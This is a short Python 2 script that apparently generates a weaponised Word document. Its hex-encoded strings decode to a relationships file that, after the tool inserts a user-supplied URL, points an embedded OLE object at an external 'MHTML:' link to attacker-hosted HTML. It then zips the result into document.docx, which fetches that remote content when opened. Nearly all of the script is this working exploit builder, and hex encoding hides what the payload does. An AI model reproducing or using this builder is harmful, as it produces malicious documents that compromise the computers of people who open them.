import os, sys, subprocess, binascii, zipfile

xml1 =(
"3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D225554462D3822207374"
"616E64616C6F6E653D22796573223F3E0D0A3C52656C6174696F6E736869707320786D6C6E733D"
"22687474703A2F2F736368656D61732E6F70656E786D6C666F726D6174732E6F72672F7061636B"
"6167652F323030362F72656C6174696F6E7368697073223E3C52656C6174696F6E736869702049"
"643D22724964382220547970653D22687474703A2F2F736368656D61732E6F70656E786D6C666F"
"726D6174732E6F72672F6F6666696365446F63756D656E742F323030362F72656C6174696F6E73"
"686970732F7468656D6522205461726765743D227468656D652F7468656D65312E786D6C222F3E"
"3C52656C6174696F6E736869702049643D22724964332220547970653D22687474703A2F2F7363"
"68656D61732E6F70656E786D6C666F726D6174732E6F72672F6F6666696365446F63756D656E74"
"2F323030362F72656C6174696F6E73686970732F77656253657474696E67732220546172676574"
"3D2277656253657474696E67732E786D6C222F3E3C52656C6174696F6E736869702049643D2272"
"4964372220547970653D22687474703A2F2F736368656D61732E6F70656E786D6C666F726D6174"
"732E6F72672F6F6666696365446F63756D656E742F323030362F72656C6174696F6E7368697073"
"2F666F6E745461626C6522205461726765743D22666F6E745461626C652E786D6C222F3E3C5265"
"6C6174696F6E736869702049643D22724964322220547970653D22687474703A2F2F736368656D"
"61732E6F70656E786D6C666F726D6174732E6F72672F6F6666696365446F63756D656E742F3230"
"30362F72656C6174696F6E73686970732F73657474696E677322205461726765743D2273657474"
"696E67732E786D6C222F3E3C52656C6174696F6E736869702049643D2272496431222054797065"
"3D22687474703A2F2F736368656D61732E6F70656E786D6C666F726D6174732E6F72672F6F6666"
"696365446F63756D656E742F323030362F72656C6174696F6E73686970732F7374796C65732220"
"5461726765743D227374796C65732E786D6C222F3E3C52656C6174696F6E736869702049643D22"
"724964362220547970653D22687474703A2F2F736368656D61732E6F70656E786D6C666F726D61"
"74732E6F72672F6F6666696365446F63756D656E742F323030362F72656C6174696F6E73686970"
"732F6F6C654F626A65637422205461726765743D224D48544D4C3A"
)

xml2 =(
"22205461726765744D6F64653D2245787465726E616C222F3E3C52656C6174696F6E7368697020"
"49643D22724964352220547970653D22687474703A2F2F736368656D61732E6F70656E786D6C66"
"6F726D6174732E6F72672F6F6666696365446F63756D656E742F323030362F72656C6174696F6E"
"73686970732F696D61676522205461726765743D226D656469612F696D616765322E776D66222F"
"3E3C52656C6174696F6E736869702049643D22724964342220547970653D22687474703A2F2F73"
"6368656D61732E6F70656E786D6C666F726D6174732E6F72672F6F6666696365446F63756D656E"
"742F323030362F72656C6174696F6E73686970732F696D61676522205461726765743D226D6564"
"69612F696D616765312E6A706567222F3E3C2F52656C6174696F6E73686970733E"
)

URL = (sys.argv[1])

print "Usage: " + sys.argv[0] + " URL of HTML" 

xml_head = bytearray(binascii.unhexlify(xml1))
xml_foot = bytearray(binascii.unhexlify(xml2))


final = (xml_head+URL+"\x21"+URL+xml_foot)

file = "doc\\word\\_rels\\document.xml.rels"
f = open(file,mode='wb')
f.write(final)
f.close()
print ("[+] Injected URL in documents.xml.rels")

def zip_directory(folder_path, zip_path):
    with zipfile.ZipFile(zip_path, mode='w') as zipf:
        len_dir_path = len(folder_path)
        for root, _, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, file_path[len_dir_path:])
                #zipf.write(file_path, file_path[len_dir_path:], zipfile.ZIP_DEFLATED)    # Uncomment this to create a smaller size document, and comment the line just above this one.
                
zip_directory('doc/', 'document.docx')

print ("[+] document.docx file generated successfully")